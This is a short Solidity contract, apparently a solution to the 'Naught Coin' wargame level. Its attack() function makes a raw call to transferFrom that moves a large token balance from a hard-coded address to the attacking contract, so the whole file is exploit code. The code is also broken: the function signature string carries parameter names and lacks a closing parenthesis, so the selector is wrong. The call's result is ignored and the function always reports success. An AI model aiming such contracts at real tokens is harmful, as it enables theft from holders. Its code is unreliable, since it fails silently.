// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract NaughtCoinAttack {

    address public victim;

    constructor (address _addr) public {
        victim = _addr;
    }

    function attack() public returns (bool){
       victim.call(abi.encodeWithSignature("transferFrom(address sender, address recipient, uint256 amount", 0x1f7972A40f8129A311e6C6a089f87347adc0e244, address(this), 1000000000000000000000000));
        return true;
    }

    receive() external payable {

        
    }
}